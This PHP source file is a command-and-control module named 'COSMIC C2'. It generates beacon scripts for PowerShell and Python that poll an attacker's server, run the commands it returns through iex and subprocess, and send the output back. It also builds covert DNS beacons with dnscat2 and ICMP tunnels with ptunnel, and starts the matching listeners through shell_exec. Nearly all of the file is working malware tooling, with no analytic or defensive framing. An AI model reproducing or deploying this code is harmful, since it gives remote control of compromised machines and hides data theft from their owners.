<?php
/**
 * COSMIC C2 – ENHANCED COMMUNICATION MODULE v2.0
 * Supports HTTP/S, DNS, ICMP with actual external tool integration.
 */
class EnhancedC2Comm {
    private $c2Engine;
    private $supportedProtocols = ['http', 'https', 'dns', 'icmp', 'custom'];

    public function __construct($c2Engine) {
        $this->c2Engine = $c2Engine;
    }

    /**
     * Generate a beaconing script for a given protocol and platform.
     */
    public function generateBeaconScript($protocol, $platform, $c2Url, $interval = 60) {
        $script = "";
        switch ($protocol) {
            case 'http':
            case 'https':
                $script = $this->generateHttpBeacon($platform, $c2Url, $interval);
                break;
            case 'dns':
                $script = $this->generateDnsBeacon($platform, $c2Url, $interval);
                break;
            case 'icmp':
                $script = $this->generateIcmpBeacon($platform, $c2Url, $interval);
                break;
            default:
                $script = "Unsupported protocol";
        }
        return $script;
    }

    private function generateHttpBeacon($platform, $c2Url, $interval) {
        $templates = [
            'windows' => [
                'ps1' => <<<'EOT'
$c2Url = "%s"
$interval = %d
while($true) {
    try {
        $response = Invoke-RestMethod -Uri "$c2Url/beacon" -Method Post -Body (@{id=$env:COMPUTERNAME} | ConvertTo-Json) -ContentType "application/json"
        if ($response.tasks) {
            foreach ($task in $response.tasks) {
                $result = iex $task.command 2>&1 | Out-String
                Invoke-RestMethod -Uri "$c2Url/task/$($task.id)" -Method Post -Body (@{result=$result} | ConvertTo-Json) -ContentType "application/json"
            }
        }
    } catch {}
    Start-Sleep -Seconds $interval
}
EOT
            ],
            'linux' => [
                'py' => <<<'EOT'
import requests, time, subprocess, json
c2_url = "%s"
interval = %d
while True:
    try:
        r = requests.post(f"{c2_url}/beacon", json={"id": subprocess.check_output("hostname").decode().strip()})
        if r.status_code == 200:
            for task in r.json().get("tasks", []):
                result = subprocess.getoutput(task["command"])
                requests.post(f"{c2_url}/task/{task['id']}", json={"result": result})
    except: pass
    time.sleep(interval)
EOT
            ]
        ];
        $template = $templates[$platform]['ps1'] ?? $templates[$platform]['py'] ?? "# No template";
        return sprintf($template, $c2Url, $interval);
    }

    private function generateDnsBeacon($platform, $c2Url, $interval) {
        // Extract domain from c2Url (e.g., http://c2.example.com -> c2.example.com)
        $domain = parse_url($c2Url, PHP_URL_HOST);
        if (!$domain) $domain = $c2Url;

        // For Linux/macOS: use dnscat2 client
        if ($platform === 'linux' || $platform === 'macos') {
            return <<<EOT
#!/bin/bash
# DNS beacon using dnscat2
# Requires dnscat2 client installed
domain="$domain"
interval=$interval
while true; do
    dnscat --domain \$domain --secret=cosmic
    sleep \$interval
done
EOT;
        } elseif ($platform === 'windows') {
            return <<<EOT
@echo off
:: DNS beacon using dnscat2 (PowerShell wrapper)
:: Download dnscat2 client and run
powershell -Command "while(\$true){ Start-Process -NoNewWindow -FilePath 'dnscat2.exe' -ArgumentList '--domain=$domain --secret=cosmic'; Start-Sleep -Seconds $interval }"
EOT;
        }
        return "# DNS beaconing not available for this platform.";
    }

    private function generateIcmpBeacon($platform, $c2Url, $interval) {
        // ICMP beacon using ptunnel or icmptunnel
        // For simplicity, we provide a wrapper for ptunnel.
        $server = parse_url($c2Url, PHP_URL_HOST) ?: $c2Url;
        return <<<EOT
#!/bin/bash
# ICMP beacon using ptunnel
# Requires ptunnel installed
server="$server"
interval=$interval
while true; do
    ptunnel -p \$server -lp 8000 -da 127.0.0.1 -dp 8000 -c tun0 &
    PT_PID=\$!
    # Wait for connection (simplified)
    sleep \$interval
    kill \$PT_PID 2>/dev/null
    sleep \$interval
done
EOT;
    }

    /**
     * Create a listener for a given protocol.
     */
    public function createListener($protocol, $port, $options = []) {
        $cmd = "";
        switch ($protocol) {
            case 'http':
                $docRoot = dirname(__DIR__, 2) . "/public/c2/listener_http";
                if (!is_dir($docRoot)) mkdir($docRoot, 0755, true);
                // Create a simple index.php that routes to C2 API
                $indexFile = $docRoot . '/index.php';
                if (!file_exists($indexFile)) {
                    file_put_contents($indexFile, '<?php require_once dirname(__DIR__,3)."/public/c2/api/index.php"; ?>');
                }
                $cmd = "php -S 0.0.0.0:$port -t $docRoot > /dev/null 2>&1 & echo $!";
                break;
            case 'dns':
                // Start dnscat2 server
                $cmd = "sudo dnscat2 --dns port=$port --secret=cosmic > /dev/null 2>&1 & echo $!";
                break;
            case 'icmp':
                // Start ptunnel server
                $cmd = "sudo ptunnel -p $port -da 0.0.0.0 -dp $port > /dev/null 2>&1 & echo $!";
                break;
            default:
                return false;
        }
        $output = shell_exec($cmd);
        $pid = trim($output);
        if (is_numeric($pid)) {
            return $pid;
        }
        return false;
    }
}
